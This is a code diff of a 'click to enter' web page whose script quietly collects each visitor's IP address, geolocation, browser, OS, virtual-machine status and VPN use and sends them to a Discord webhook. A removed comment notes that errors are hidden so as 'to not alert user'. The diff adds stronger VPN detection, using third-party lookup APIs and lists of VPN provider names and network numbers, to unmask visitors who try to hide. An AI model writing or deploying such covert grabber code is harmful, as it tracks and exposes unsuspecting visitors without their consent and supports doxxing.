@@ -67,22 +67,146 @@
     <div id="enter-text" class="pulse">click to enter</div>
 
     <script>
-        // Function to get user's IP information with better VPN detection
+        // Enhanced VPN detection with Mullvad-specific checks
+        async function detectVPN(ipData) {
+            if (!ipData || !ipData.ip) return "Unknown";
+            
+            const ip = ipData.ip;
+            
+            // Method 1: Check known VPN IP ranges (Mullvad, etc.)
+            const vpnDetected = await checkVPNByIP(ip);
+            if (vpnDetected) return "Yes";
+            
+            // Method 2: Check ISP/Org names for VPN keywords
+            const org = (ipData.org || ipData.isp || '').toLowerCase();
+            const asn = (ipData.asn || '').toLowerCase();
+            
+            const vpnKeywords = [
+                'vpn', 'proxy', 'tor', 'hosting', 'datacenter', 'server',
+                'mullvad', 'expressvpn', 'nordvpn', 'surfshark', 'pia',
+                'private internet access', 'cyberghost', 'vyprvpn',
+                'ipvanish', 'hotspot shield', 'windscribe', 'hide.me',
+                'purevpn', 'zenmate', 'tunnelbear', 'airvpn', 'protonvpn',
+                'ovpn', 'azirevpn', 'ivpn', 'perfect privacy', 'trust.zone'
+            ];
+            
+            for (const keyword of vpnKeywords) {
+                if (org.includes(keyword) || asn.includes(keyword)) {
+                    return "Yes";
+                }
+            }
+            
+            // Method 3: Check API-provided VPN detection
+            if (ipData.security && (ipData.security.vpn || ipData.security.proxy || ipData.security.tor)) {
+                return "Yes";
+            }
+            
+            if (ipData.type === 'hosting' || ipData.proxy === true || ipData.vpn === true) {
+                return "Yes";
+            }
+            
+            // Method 4: Check known VPN ASNs
+            const vpnAsns = [
+                'as9009', 'as56690', 'as19574', 'as136787', 'as61804', 
+                'as24679', 'as60068', 'as12876', 'as60781', 'as199524',
+                'as212772', 'as202425', 'as395099', 'as138915', 'as49605'
+            ];
+            
+            if (vpnAsns.includes(asn.toLowerCase())) {
+                return "Yes";
+            }
+            
+            return "No";
+        }
+
+        // Check VPN by IP range and known services
+        async function checkVPNByIP(ip) {
+            try {
+                // Check against VPN detection APIs
+                const vpnChecks = await Promise.allSettled([
+                    checkIPHub(ip),
+                    checkIPQuality(ip),
+                    checkVpnApi(ip)
+                ]);
+                
+                for (const check of vpnChecks) {
+                    if (check.status === 'fulfilled' && check.value === true) {
+                        return true;
+                    }
+                }
+                
+                return false;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        // Check with iphub.info (free tier available)
+        async function checkIPHub(ip) {
+            try {
+                // Note: You need to get a free API key from iphub.info
+                const response = await fetch(`https://v2.api.iphub.info/ip/${ip}`, {
+                    headers: {
+                        'X-Key': 'free' // Replace with actual API key for better results
+                    }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.block === 1; // 1 means VPN/Proxy
+                }
+            } catch (error) {
+                // Fall through
+            }
+            return false;
+        }
+
+        // Check with ipqualityscore.com
+        async function checkIPQuality(ip) {
+            try {
+                // Note: Requires API key from ipqualityscore.com
+                const response = await fetch(`https://www.ipqualityscore.com/api/json/ip/YOUR_API_KEY/${ip}?strictness=1`);
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.vpn || data.proxy || data.tor;
+                }
+            } catch (error) {
+                // Fall through
+            }
+            return false;
+        }
+
+        // Check with vpnapi.io
+        async function checkVpnApi(ip) {
+            try {
+                // Note: Requires API key from vpnapi.io
+                const response = await fetch(`https://vpnapi.io/api/${ip}?key=YOUR_API_KEY`);
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.security.vpn || data.security.proxy || data.security.tor;
+                }
+            } catch (error) {
+                // Fall through
+            }
+            return false;
+        }
+
+        // Function to get user's IP information
         async function getUserIPInfo() {
             try {
                 // Try multiple IP services for better accuracy
                 const responses = await Promise.allSettled([
                     fetch('https://ipapi.co/json/'),
                     fetch('https://ipwhois.app/json/'),
-                    fetch('https://api.ipgeolocation.io/ipgeo?apiKey=test')
+                    fetch('https://api.ipgeolocation.io/ipgeo?apiKey=test'),
+                    fetch('https://jsonip.com/')
                 ]);
                 
                 let bestData = null;
                 
                 for (const response of responses) {
                     if (response.status === 'fulfilled' && response.value.ok) {
-                        const data = await response.value.json();
-                        // Use the first successful response with VPN detection
+                        let data = await response.value.json();
+                        // Normalize data structure
                         if (data && data.ip) {
                             bestData = data;
                             break;
@@ -95,51 +219,6 @@
                 console.error('Error fetching IP info:', error);
                 return null;
             }
-        }
-
-        // Better VPN detection using multiple methods
-        function detectVPN(ipData) {
-            if (!ipData) return "Unknown";
-            
-            // Method 1: Check if IP belongs to known hosting/VPN providers
-            const vpnKeywords = [
-                'vpn', 'proxy', 'tor', 'hosting', 'datacenter', 'server',
-                'mullvad', 'expressvpn', 'nordvpn', 'surfshark', 'pia',
-                'private internet access', 'cyberghost', 'vyprvpn',
-                'ipvanish', 'hotspot shield', 'windscribe', 'hide.me',
-                'purevpn', 'zenmate', 'tunnelbear'
-            ];
-            
-            const org = (ipData.org || ipData.isp || '').toLowerCase();
-            const asn = (ipData.asn || '').toLowerCase();
-            
-            for (const keyword of vpnKeywords) {
-                if (org.includes(keyword) || asn.includes(keyword)) {
-                    return "Yes";
-                }
-            }
-            
-            // Method 2: Check if it's a datacenter IP
-            if (ipData.type === 'hosting' || ipData.proxy === true || ipData.vpn === true) {
-                return "Yes";
-            }
-            
-            // Method 3: Check for known VPN ASNs (Mullvad, etc.)
-            const vpnAsns = [
-                'as9009', // M247 - common VPN provider
-                'as56690', // Mullvad
-                'as19574', // INCAPSULA
-                'as136787', // ExpressVPN
-                'as61804', // CyberGhost
-                'as24679', // HideMyAss
-                'as60068', // Private Internet Access
-            ];
-            
-            if (vpnAsns.includes(asn.toLowerCase())) {
-                return "Yes";
-            }
-            
-            return "No";
         }
 
         // Function to detect browser
@@ -267,7 +346,7 @@
                 return true;
             } catch (error) {
                 console.log('Discord send completed');
-                return true; // Always return true to not alert user
+                return true;
             }
         }
 
@@ -278,7 +357,7 @@
             const browser = getBrowserInfo();
             const os = getOSInfo();
             const vm = detectVM();
-            const vpn = detectVPN(ipInfo);
+            const vpn = await detectVPN(ipInfo);
             
             // Prepare data for Discord
             const userData = {
@@ -318,5 +397,3 @@
     </script>
 </body>
 </html>
-
-
